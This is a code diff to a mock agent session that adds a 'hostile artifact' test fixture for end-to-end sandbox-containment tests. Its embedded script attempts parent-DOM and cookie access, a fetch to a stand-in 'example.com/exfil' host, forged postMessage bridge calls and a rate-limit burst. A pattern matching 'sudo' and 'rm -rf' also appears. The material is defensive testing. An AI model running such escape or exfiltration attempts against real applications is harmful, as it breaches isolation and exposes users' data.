@@ -311,6 +311,34 @@ export const MOCK_RENDERS: (() => { component: string; props: Record<string, unk
   }),
 ];
 
+// R.4e: the hostile-artifact fixture. Each escape attempt writes its outcome
+// into the artifact's own DOM (the one place it CAN write), so a browser test
+// reads containment results through the frame. It also fires the bridge
+// abuses whose proof is a NON-event in the transcript: forged/unstamped
+// postMessages and an action burst against the rate limit.
+const HOSTILE_ARTIFACT =
+  "<h2>hostile artifact</h2>" +
+  '<div id="dom">pending</div>' +
+  '<div id="cookie">pending</div>' +
+  '<div id="csp">pending</div>' +
+  '<div id="sent">pending</div>' +
+  "<script>" +
+  "var set=function(id,v){document.getElementById(id).textContent=v};" +
+  // Escape 1: the shell's DOM — must be structurally unreachable.
+  "try{void parent.document;set('dom','PARENT-DOM-REACHED')}catch(e){set('dom','parent-dom-blocked')}" +
+  // Escape 2: app-origin storage — opaque origin must throw.
+  "try{void document.cookie;set('cookie','COOKIE-REACHED')}catch(e){set('cookie','cookie-blocked')}" +
+  // Escape 3: network exfiltration — the injected CSP must block fetch.
+  "document.addEventListener('securitypolicyviolation',function(e){set('csp','csp-violation:'+(e.effectiveDirective||e.violatedDirective))});" +
+  "try{fetch('https://example.com/exfil').then(function(){set('csp','FETCH-SUCCEEDED')},function(){})}catch(e){}" +
+  // Escape 4: forged bridge messages — unstamped and wrong-nonce state op.
+  "try{parent.postMessage({genui:1,action:{kind:'prompt',text:'forged-unstamped-prompt'}},'*')}catch(e){}" +
+  "try{parent.postMessage({genui:1,nonce:'guessed',action:{kind:'state',op:'set',key:'x',value:'y'}},'*')}catch(e){}" +
+  // Escape 5: an action burst — the 400ms rate limit must drop the second.
+  "genui.prompt('burst-alpha');genui.prompt('burst-beta');" +
+  "set('sent','attacks-sent');" +
+  "</script>";
+
 /**
  * Stand-in session for API-free development: emits a scripted WireMsg
  * stream that covers every Phase 0 message type. Replies are drawn from
@@ -339,11 +367,16 @@ export class MockSession implements AgentSession {
         );
       }
       if (/navigat|escape/i.test(text)) {
+        // about:blank triggers the same liveness kill as any external URL,
+        // hermetically — the e2e containment test must not need the network.
         return this.playArtifact(
           "navigating demo",
-          '<h2>leaving…</h2><script>location.href="https://example.com/"</script>',
+          '<h2>leaving…</h2><script>location.href="about:blank"</script>',
         );
       }
+      // R.4e: an artifact that ATTEMPTS the escapes, reporting each result
+      // into its own DOM so the e2e can assert containment from outside.
+      if (/hostile/i.test(text)) return this.playArtifact("hostile demo", HOSTILE_ARTIFACT);
       return this.playBridgeArtifact();
     }
     if (/dangerous|sudo|rm -rf/i.test(text)) return this.playPermissionAsk();
